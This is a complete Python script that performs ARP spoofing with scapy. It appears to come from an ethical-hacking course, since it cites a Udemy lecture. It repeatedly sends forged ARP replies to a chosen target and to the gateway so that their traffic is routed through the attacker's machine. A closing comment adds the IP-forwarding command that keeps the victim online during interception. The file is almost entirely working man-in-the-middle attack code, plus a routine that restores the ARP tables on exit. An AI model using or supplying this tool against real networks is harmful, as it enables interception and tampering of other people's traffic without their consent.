# ARP Spoofer

#!/use/bin/env python
import scapy.all as scapy, optparse, time, sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway's IP address.")
    parser.add_option("-t", "--target", dest="target", help="Target's IP address.")
    (options, arguments) = parser.parse_args()
    if not options.gateway:
        parser.error("[-] Please specify IP address of a gateway. Use --help for more info.")
    if not options.target:
        parser.error("[-] Please specify IP address of a target. Use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Sent " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C. Resetting ARP tables... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

'''
echo 1 > /proc/sys/net/ipv4/ip_forward    # Enable IP-forwarding. While running this program, without this command, the victim cannot use Internet.
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/9570986?start=0 (Restoring ARP Tables When an Exception Occures)
'''